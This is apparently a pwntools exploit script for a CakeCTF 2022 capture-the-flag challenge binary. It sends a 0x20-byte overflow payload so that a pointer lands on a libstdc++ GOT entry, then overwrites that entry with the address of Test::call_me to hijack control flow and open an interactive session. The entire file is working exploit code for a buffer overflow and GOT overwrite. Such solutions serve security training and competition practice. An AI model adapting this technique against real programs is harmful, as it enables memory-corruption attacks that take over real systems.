from subprocess import call
from pwn import *

binfile = "./chall"
context.binary = binfile
elf = ELF(binfile)

call_me = elf.symbols["_ZN4Test7call_meEv"]
got_sample = elf.got["_ZNKSt9basic_iosIcSt11char_traitsIcEE4goodEv"]

HOST='pwn1.2022.cakectf.com'
PORT=9003

conn = process(binfile)
# conn = remote(HOST, PORT)

conn.sendlineafter("choice:", "1")  # 1. set c_str

payload = b"A" * 0x20
payload += p64(got_sample)
conn.sendlineafter(":", payload)
conn.sendlineafter(":", "3")        # 3. set str
conn.sendlineafter(":", p64(call_me))

conn.interactive()
